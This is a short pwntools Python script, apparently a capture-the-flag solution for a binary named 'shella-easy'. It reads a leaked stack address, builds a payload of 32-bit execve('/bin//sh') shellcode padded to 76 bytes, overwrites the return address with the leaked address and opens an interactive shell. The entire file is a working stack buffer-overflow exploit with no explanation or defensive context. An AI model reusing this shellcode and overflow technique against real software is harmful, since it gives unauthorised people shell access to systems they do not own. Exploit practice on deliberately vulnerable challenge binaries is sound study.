#!/usr/bin/python3
import pwn
e = pwn.context.binary = pwn.ELF("./shella-easy")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
    +"\nbreak *main"
    +"\nc"
)
#p.recvuntil(" ")
leak = p.recvline()
leak = leak.strip("Yeah I'll have a ")
leak = leak.strip(" with a side of fries thanks\n")
shellcodeAdr = int(leak, 16)

payload = b"\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload += b"0"*(76-len(payload))
payload += pwn.p32(shellcodeAdr)
p.send(payload)
p.interactive()


